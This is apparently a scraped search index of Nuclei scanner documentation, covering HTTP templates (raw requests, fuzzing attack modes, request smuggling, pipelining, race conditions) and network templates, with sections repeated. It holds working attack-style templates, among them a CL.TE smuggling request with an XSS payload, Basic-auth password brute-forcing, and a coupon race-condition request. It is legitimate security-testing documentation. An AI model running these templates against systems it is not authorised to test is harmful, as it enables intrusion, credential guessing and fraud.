\u00b6 Headers can also be specified to be sent along with the requests. Headers are placed in form of key/value pairs. An example header configuration looks like this: # headers contains the headers for the request headers : # Custom user-agent header User-Agent : Some-Random-User-Agent # Custom request origin Origin : https://google.com Body \u00b6 Body specifies a body to be sent along with the request. For instance: # Body is a string sent along with the request body : \"{\\\"some random JSON\\\"}\" # Body is a string sent along with the request body : \"admin=test\" Session \u00b6 To maintain cookie based browser like session between multiple requests, you can simply use cookie-reuse: true in your template, Useful in cases where you want to maintain session between series of request to complete the exploit chain and to perform authenticated scans. # cookie-reuse accepts boolean input and false as default cookie-reuse : true Request Condition \u00b6 Request condition allows to check for condition between multiple requests for writing complex checks and exploits involving multiple HTTP request to complete the exploit chain. with DSL matcher, it can be utilized by adding req-condition: true and numbers as suffix with respective attributes, status_code_1 , status_code_3 , and body_2 for example. req-condition : true matchers : - type : dsl dsl : - \"status_code_1 == 404 && status_code_2 == 200 && contains((body_2), 'secret_string')\" Example HTTP Template \u00b6 The final template file for the .git/config file mentioned above is as follows: id : git-config info : name : Git Config File author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. requests : - method : GET path : - \"{{BaseURL}}/.git/config\" matchers : - type : word words : - \"[core]\" RAW HTTP requests \u00b6 Another way to create request is using raw requests which comes with more flexibility and support of DSL helper functions, like the following ones (as of now it's suggested to leave the Host header as in the example with the variable {{Hostname}} ), All the Matcher, Extractor capabilities can be used with RAW requests in same the way described above. requests : - raw : - | POST /path2/ HTTP/1.1 Host: {{Hostname}} Content-Length: 1 Origin: https://www.google.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Accept-Language: en-US,en;q=0.9 a=test&b=pd Requests can be fine tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers. RAW request format also supports various helper functions letting us do run time manipulation with input. An example of the using a helper function in the header. raw : - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} # Helper function to encode input at run time. User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 Connection: close HTTP Fuzzing \u00b6 Info Nuclei engine supports fuzzing module that allow to run various type of payloads in multiple format, It's possible to define placeholders with simple keywords (or using brackets {{helper_function(variable)}} in case mutator functions are needed), and perform sniper , pitchfork and clusterbomb attacks. The wordlist for these attacks needs to be defined during the request definition under the Payload field, with a name matching the keyword, Nuclei supports both file based and in template wordlist support and Finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values. Payloads are defined using variable name and can be referenced in the request in between \u00a7 \u00a7 or {{ }} marker. An example of the using payloads with local wordlist: requests : # HTTP Intruder fuzzing using local wordlist. - payloads : paths : params.txt header : local.txt An example of the using payloads with in template wordlist support: requests : # HTTP Intruder fuzzing using in template wordlist. - payloads : password : - admin - guest - password Note:- be careful while selecting attack type, as unexpected input will break the template. For example, if you used clusterbomb or pitchfork as attack type and defined only one variable in the payload section, template will fail to compile, as clusterbomb or pitchfork expect more then one variable to use in the template. Attack mode \u00b6 Nuclei engine supports multiple attack types, including sniper which generally used to fuzz single parameter, clusterbomb and pitchfork for fuzzing multiple parameters which works same as classical burp intruder. Type sniper pitchfork clusterbomb Support sniper The sniper attack uses only one payload set, and it replaces only one position at a time. It loops through the payload set, first replacing only the first marked position with the payload and leaving all other positions to their original value. After its done with the first position, it continues with the second position. pitchfork The pitchfork attack type uses one payload set for each position. It places the first payload in the first position, the second payload in the second position, and so on. It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on. clusterbomb The cluster bomb attack tries all different combinations of payloads. It still puts the first payload in the first position, and the second payload in the second position. But when it loops through the payload sets, it tries all combinations. It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on. This attack type is useful for a brute-force attack. Load a list of commonly used usernames in the first payload set, and a list of commonly used passwords in the second payload set. The cluster bomb attack will then try all combinations. More details here . An example of the using using clusterbomb attack to fuzz. requests : - payloads : path : helpers/wordlists/prams.txt header : helpers/wordlists/header.txt # Defining HTTP fuzz attack type attack : clusterbomb raw : - | POST /?file={{path}} HTTP/1.1 User-Agent: {{header}} Host: {{Hostname}} Unsafe HTTP Requests \u00b6 Nuclei supports rawhttp for complete request control and customization allowing any kind of malformed requests for issues like HTTP request smuggling, Host header injection, CRLF with malformed characters and more. rawhttp library is disabled by default and can be enabled by including unsafe: true in the request block. Here is an example of HTTP request smuggling detection template using rawhttp . requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a\"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 - |+ GET /post?postId=5 HTTP/1.1 Host: {{Hostname}} # Enables rawhttp client unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"<script>alert(1)</script>\")' Advance Fuzzing \u00b6 We\u2019ve enriched nuclei to allow advanced fuzzing of web servers. Users can now use multiple options to tune HTTP fuzzing workflows. Pipelining \u00b6 HTTP Pipelining support has been added which allows multiple HTTP requests to be sent on the same connection inspired from http-desync-attacks-request-smuggling-reborn . Before running HTTP pipelining based templates, make sure the running target supports HTTP Pipeline connection, otherwise nuclei engine fallbacks to standard HTTP request engine. If you want to confirm the given domain or list of subdomains supports HTTP Pipelining, httpx has a flag -pipeline to do so. An example configuring showing pipelining attributes of nuclei. unsafe : true pipeline : true pipeline-max-connections : 40 pipeline-max-workers : 25000 An example template demonstrating pipelining capabilities of nuclei has been provided below- id : pipeline-testing info : name : pipeline testing author : pdteam severity : info requests : - payloads : path : path_wordlist.txt attack : sniper unsafe : true pipeline : true pipeline-max-connections : 40 pipeline-max-workers : 25000 raw : - |+ GET /\u00a7path\u00a7 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: application/json, text/plain, */* Accept-Language: en-US,en;q=0.5 Referer: {{BaseURL}} Connection: keep-alive matchers : - type : status part : header status : - 200 Connection pooling \u00b6 While the earlier versions of nuclei did not do connection pooling, users can now configure templates to either use HTTP connection pooling or not. This allows for faster scanning based on requirement. To enable connection pooling in the template, threads attribute can be defined with respective number of threads you wanted to use in the payloads sections. Connection: Close header can not be used in HTTP connection pooling template, otherwise engine will fail and fallback to standard HTTP requests with pooling. An example template using HTTP connection pooling- id : fuzzing-example info : name : Connection pooling example author : pdteam severity : info requests : - payloads : password : password.txt threads : 40 attack : sniper raw : - | GET /protected HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('admin:\u00a7password\u00a7')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 matchers-condition : and matchers : - type : status status : - 200 - type : word words : - \"Unique string\" part : body Smuggling \u00b6 HTTP Smuggling is a class of Web-Attacks recently made popular by Portswigger\u2019s Research into the topic. For an in-depth overview, please visit the article linked above. In the open source space, detecting http smuggling is difficult particularly due to the requests for detection being malformed by nature. Nuclei is able to reliably detect HTTP Smuggling vulnerabilities utilising the rawhttp engine. The most basic example of a HTTP Smuggling vulnerability is CL.TE Smuggling. An example template to detect a CE.TL HTTP Smuggling vulnerability is provided below using the unsafe: true attribute for rawhttp based requests. id : CL.TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : word words : - 'Unrecognized method GPOST' More examples are available in template-examples section for smuggling templates. Race conditions \u00b6 Race Conditions are another class of bugs not easily automated via traditional tooling. Burp Suite introduced a Gate mechanism to Turbo Intruder where all the bytes for all the requests are sent expect the last one at once which is only sent together for all requests synchronizing the send event. We have implemented Gate mechanism in nuclei engine and allow them run via templates which makes the testing for this specfic bug class simple and portable. To enable race condition check within template, race attribute can be set to true and race_count defines the number of simultaneous request you want to initiate. Below is an example template where the same request is repeated for 10 times using the gate logic. id : race-condition-testing info : name : Race condition testing author : pdteam severity : info requests : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} Pragma: no-cache Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200 You can simply replace the POST request with any suspected vulnerable request and change the race_count as per your need and it's ready to run. nuclei -t race.yaml -target https://api.target.com Multi request race condition testing For the scenario when multiple requests needs to be sent in order to exploit the race condition, we can make use of threads. threads : 5 race : true threads is a total number of request you wanted make with the template to perform race condition testing. Below is an example template where multiple (5) unique request will be sent at the same time using the gate logic. id : multi-request-race info : name : Race condition testing with multiple requests author : pd-team severity : info requests : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true","title":"Base requests"},{"location":"templating-guide/protocols/http/#headers","text":"Headers can also be specified to be sent along with the requests. Headers are placed in form of key/value pairs. An example header configuration looks like this: # headers contains the headers for the request headers : # Custom user-agent header User-Agent : Some-Random-User-Agent # Custom request origin Origin : https://google.com","title":"Headers"},{"location":"templating-guide/protocols/http/#body","text":"Body specifies a body to be sent along with the request. For instance: # Body is a string sent along with the request body : \"{\\\"some random JSON\\\"}\" # Body is a string sent along with the request body : \"admin=test\"","title":"Body"},{"location":"templating-guide/protocols/http/#session","text":"To maintain cookie based browser like session between multiple requests, you can simply use cookie-reuse: true in your template, Useful in cases where you want to maintain session between series of request to complete the exploit chain and to perform authenticated scans. # cookie-reuse accepts boolean input and false as default cookie-reuse : true","title":"Session"},{"location":"templating-guide/protocols/http/#request-condition","text":"Request condition allows to check for condition between multiple requests for writing complex checks and exploits involving multiple HTTP request to complete the exploit chain. with DSL matcher, it can be utilized by adding req-condition: true and numbers as suffix with respective attributes, status_code_1 , status_code_3 , and body_2 for example. req-condition : true matchers : - type : dsl dsl : - \"status_code_1 == 404 && status_code_2 == 200 && contains((body_2), 'secret_string')\"","title":"Request Condition"},{"location":"templating-guide/protocols/http/#example-http-template","text":"The final template file for the .git/config file mentioned above is as follows: id : git-config info : name : Git Config File author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. requests : - method : GET path : - \"{{BaseURL}}/.git/config\" matchers : - type : word words : - \"[core]\"","title":"Example HTTP Template"},{"location":"templating-guide/protocols/http/#raw-http-requests","text":"Another way to create request is using raw requests which comes with more flexibility and support of DSL helper functions, like the following ones (as of now it's suggested to leave the Host header as in the example with the variable {{Hostname}} ), All the Matcher, Extractor capabilities can be used with RAW requests in same the way described above. requests : - raw : - | POST /path2/ HTTP/1.1 Host: {{Hostname}} Content-Length: 1 Origin: https://www.google.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Accept-Language: en-US,en;q=0.9 a=test&b=pd Requests can be fine tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers. RAW request format also supports various helper functions letting us do run time manipulation with input. An example of the using a helper function in the header. raw : - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} # Helper function to encode input at run time. User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 Connection: close","title":"RAW HTTP requests"},{"location":"templating-guide/protocols/http/#http-fuzzing","text":"Info Nuclei engine supports fuzzing module that allow to run various type of payloads in multiple format, It's possible to define placeholders with simple keywords (or using brackets {{helper_function(variable)}} in case mutator functions are needed), and perform sniper , pitchfork and clusterbomb attacks. The wordlist for these attacks needs to be defined during the request definition under the Payload field, with a name matching the keyword, Nuclei supports both file based and in template wordlist support and Finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values. Payloads are defined using variable name and can be referenced in the request in between \u00a7 \u00a7 or {{ }} marker. An example of the using payloads with local wordlist: requests : # HTTP Intruder fuzzing using local wordlist. - payloads : paths : params.txt header : local.txt An example of the using payloads with in template wordlist support: requests : # HTTP Intruder fuzzing using in template wordlist. - payloads : password : - admin - guest - password Note:- be careful while selecting attack type, as unexpected input will break the template. For example, if you used clusterbomb or pitchfork as attack type and defined only one variable in the payload section, template will fail to compile, as clusterbomb or pitchfork expect more then one variable to use in the template.","title":"HTTP Fuzzing"},{"location":"templating-guide/protocols/http/#attack-mode","text":"Nuclei engine supports multiple attack types, including sniper which generally used to fuzz single parameter, clusterbomb and pitchfork for fuzzing multiple parameters which works same as classical burp intruder. Type sniper pitchfork clusterbomb Support sniper The sniper attack uses only one payload set, and it replaces only one position at a time. It loops through the payload set, first replacing only the first marked position with the payload and leaving all other positions to their original value. After its done with the first position, it continues with the second position. pitchfork The pitchfork attack type uses one payload set for each position. It places the first payload in the first position, the second payload in the second position, and so on. It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on. clusterbomb The cluster bomb attack tries all different combinations of payloads. It still puts the first payload in the first position, and the second payload in the second position. But when it loops through the payload sets, it tries all combinations. It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on. This attack type is useful for a brute-force attack. Load a list of commonly used usernames in the first payload set, and a list of commonly used passwords in the second payload set. The cluster bomb attack will then try all combinations. More details here . An example of the using using clusterbomb attack to fuzz. requests : - payloads : path : helpers/wordlists/prams.txt header : helpers/wordlists/header.txt # Defining HTTP fuzz attack type attack : clusterbomb raw : - | POST /?file={{path}} HTTP/1.1 User-Agent: {{header}} Host: {{Hostname}}","title":"Attack mode"},{"location":"templating-guide/protocols/http/#unsafe-http-requests","text":"Nuclei supports rawhttp for complete request control and customization allowing any kind of malformed requests for issues like HTTP request smuggling, Host header injection, CRLF with malformed characters and more. rawhttp library is disabled by default and can be enabled by including unsafe: true in the request block. Here is an example of HTTP request smuggling detection template using rawhttp . requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a\"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 - |+ GET /post?postId=5 HTTP/1.1 Host: {{Hostname}} # Enables rawhttp client unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"<script>alert(1)</script>\")'","title":"Unsafe HTTP Requests"},{"location":"templating-guide/protocols/http/#advance-fuzzing","text":"We\u2019ve enriched nuclei to allow advanced fuzzing of web servers. Users can now use multiple options to tune HTTP fuzzing workflows.","title":"Advance Fuzzing"},{"location":"templating-guide/protocols/http/#pipelining","text":"HTTP Pipelining support has been added which allows multiple HTTP requests to be sent on the same connection inspired from http-desync-attacks-request-smuggling-reborn . Before running HTTP pipelining based templates, make sure the running target supports HTTP Pipeline connection, otherwise nuclei engine fallbacks to standard HTTP request engine. If you want to confirm the given domain or list of subdomains supports HTTP Pipelining, httpx has a flag -pipeline to do so. An example configuring showing pipelining attributes of nuclei. unsafe : true pipeline : true pipeline-max-connections : 40 pipeline-max-workers : 25000 An example template demonstrating pipelining capabilities of nuclei has been provided below- id : pipeline-testing info : name : pipeline testing author : pdteam severity : info requests : - payloads : path : path_wordlist.txt attack : sniper unsafe : true pipeline : true pipeline-max-connections : 40 pipeline-max-workers : 25000 raw : - |+ GET /\u00a7path\u00a7 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: application/json, text/plain, */* Accept-Language: en-US,en;q=0.5 Referer: {{BaseURL}} Connection: keep-alive matchers : - type : status part : header status : - 200","title":"Pipelining"},{"location":"templating-guide/protocols/http/#connection-pooling","text":"While the earlier versions of nuclei did not do connection pooling, users can now configure templates to either use HTTP connection pooling or not. This allows for faster scanning based on requirement. To enable connection pooling in the template, threads attribute can be defined with respective number of threads you wanted to use in the payloads sections. Connection: Close header can not be used in HTTP connection pooling template, otherwise engine will fail and fallback to standard HTTP requests with pooling. An example template using HTTP connection pooling- id : fuzzing-example info : name : Connection pooling example author : pdteam severity : info requests : - payloads : password : password.txt threads : 40 attack : sniper raw : - | GET /protected HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('admin:\u00a7password\u00a7')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 matchers-condition : and matchers : - type : status status : - 200 - type : word words : - \"Unique string\" part : body","title":"Connection pooling"},{"location":"templating-guide/protocols/http/#smuggling","text":"HTTP Smuggling is a class of Web-Attacks recently made popular by Portswigger\u2019s Research into the topic. For an in-depth overview, please visit the article linked above. In the open source space, detecting http smuggling is difficult particularly due to the requests for detection being malformed by nature. Nuclei is able to reliably detect HTTP Smuggling vulnerabilities utilising the rawhttp engine. The most basic example of a HTTP Smuggling vulnerability is CL.TE Smuggling. An example template to detect a CE.TL HTTP Smuggling vulnerability is provided below using the unsafe: true attribute for rawhttp based requests. id : CL.TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te requests : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : word words : - 'Unrecognized method GPOST' More examples are available in template-examples section for smuggling templates.","title":"Smuggling"},{"location":"templating-guide/protocols/http/#race-conditions","text":"Race Conditions are another class of bugs not easily automated via traditional tooling. Burp Suite introduced a Gate mechanism to Turbo Intruder where all the bytes for all the requests are sent expect the last one at once which is only sent together for all requests synchronizing the send event. We have implemented Gate mechanism in nuclei engine and allow them run via templates which makes the testing for this specfic bug class simple and portable. To enable race condition check within template, race attribute can be set to true and race_count defines the number of simultaneous request you want to initiate. Below is an example template where the same request is repeated for 10 times using the gate logic. id : race-condition-testing info : name : Race condition testing author : pdteam severity : info requests : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} Pragma: no-cache Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200 You can simply replace the POST request with any suspected vulnerable request and change the race_count as per your need and it's ready to run. nuclei -t race.yaml -target https://api.target.com Multi request race condition testing For the scenario when multiple requests needs to be sent in order to exploit the race condition, we can make use of threads. threads : 5 race : true threads is a total number of request you wanted make with the template to perform race condition testing. Below is an example template where multiple (5) unique request will be sent at the same time using the gate logic. id : multi-request-race info : name : Race condition testing with multiple requests author : pd-team severity : info requests : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true","title":"Race conditions"},{"location":"templating-guide/protocols/network/","text":"Network Requests \u00b6 Nuclei can act as an automatable Netcat , allowing users to send bytes across the wire and receive them, while providing matching and extracting capabilities on the response. Network Requests start with a network block which specifies the start of the requests for the template. # Start the requests for the template right here network : Inputs \u00b6 First thing in the request is inputs . Inputs are the data that will be sent to the server, and optionally any data to read from the server. At it's most simple, just specify a string and it will be sent across the network socket. # inputs is the list of inputs to send to the server inputs : - data : \"TEST\\r\\n\" You can also send hex encoded text that will be first decoded and the raw bytes will be sent to the server. inputs : - data : \"50494e47\" type : hex - data : \"\\r\\n\" Helper function expressions can also be defined in input and will be first evaluated and then sent to the server. The last Hex Encoded example can be sent with helper functions this way - inputs : - data : 'hex_decode(\"50494e47\")\\r\\n' One last thing that can be done with inputs is reading data from the socket. Specifying read-size with a non-zero value will do the trick. You can also assign the read data some name, so matching can be done on that part. inputs : - read-size : 8 Example with reading a number of bytes, and only matching on them. inputs : - read-size : 8 name : prefix ... matchers : - type : word part : prefix words : - \"CAFEBABE\" Multiple steps can be chained together in sequence to do network reading / writing. Host \u00b6 The next part of the requests is the host to connect to. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. Hostname - variable is replaced by the hostname provided on command line. An example name value: host : - \"{{Hostname}}\" Nuclei can also do TLS connection to the target server. Just add tls:// as prefix before the Hostname and you're good to go. host : - \"tls://{{Hostname}}\" If a port is specified in the host, the user supplied port is ignored and the template port takes presedence. Matchers / Extractor Parts \u00b6 Valid part values supported by Network protocol for Matchers / Extractor are - Value Description request Network Request data Final Data Read From Network Socket raw / body / all All Data recieved from Socket Example Network Template \u00b6 The final example template file for a hex encoded input to detect MongoDB running on servers with working matchers is provided below. id : input-expressions-mongodb-detect info : name : Input Expression MongoDB Detection author : pd-team severity : info reference : https://github.com/orleven/Tentacle network : - inputs : - data : \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host : - \"{{Hostname}}\" read-size : 2048 matchers : - type : word words : - \"logicalSessionTimeout\" - \"localTime\" More complete examples are provided here","title":"Network"},{"location":"templating-guide/protocols/network/#network-requests","text":"Nuclei can act as an automatable Netcat , allowing users to send bytes across the wire and receive them, while providing matching and extracting capabilities on the response. Network Requests start with a network block which specifies the start of the requests for the template. # Start the requests for the template right here network :","title":"Network Requests"},{"location":"templating-guide/protocols/network/#inputs","text":"First thing in the request is inputs . Inputs are the data that will be sent to the server, and optionally any data to read from the server. At it's most simple, just specify a string and it will be sent across the network socket. # inputs is the list of inputs to send to the server inputs : - data : \"TEST\\r\\n\" You can also send hex encoded text that will be first decoded and the raw bytes will be sent to the server. inputs : - data : \"50494e47\" type : hex - data : \"\\r\\n\" Helper function expressions can also be defined in input and will be first evaluated and then sent to the server. The last Hex Encoded example can be sent with helper functions this way - inputs : - data : 'hex_decode(\"50494e47\")\\r\\n' One last thing that can be done with inputs is reading data from the socket. Specifying read-size with a non-zero value will do the trick. You can also assign the read data some name, so matching can be done on that part. inputs : - read-size : 8 Example with reading a number of bytes, and only matching on them. inputs : - read-size : 8 name : prefix ... matchers : - type : word part : prefix words : - \"CAFEBABE\" Multiple steps can be chained together in sequence to do network reading / writing.","title":"Inputs"},{"location":"templating-guide/protocols/network/#host","text":"The next part of the requests is the host to connect to. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. Hostname - variable is replaced by the hostname provided on command line. An example name value: host : - \"{{Hostname}}\" Nuclei can also do TLS connection to the target server. Just add tls:// as prefix before the Hostname and you're good to go. host : - \"tls://{{Hostname}}\" If a port is specified in the host, the user supplied port is ignored and the template port takes presedence.","title":"Host"},{"location":"templating-guide/protocols/network/#matchers-extractor-parts","text":"Valid part values supported by Network protocol for Matchers / Extractor are - Value Description request Network Request data Final Data Read From Network Socket raw / body / all All Data recieved from Socket","title":"Matchers / Extractor Parts"},{"location":"templating-guide/protocols/network/#example-network-template","text":"The final example template file for a hex encoded input to detect MongoDB running on servers with working matchers is provided below. id : input-expressions-mongodb-detect info : name : Input Expression MongoDB Detection author : pd-team severity : info reference : https://github.com/orleven/Tentacle network : - inputs : - data : \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host : - \"{{Hostname}}\" read-size : 2048 matchers : - type : word words : - \"logicalSessionTimeout\" - \"localTime\" More complete examples are provided here","title":"Example Network Template"}]}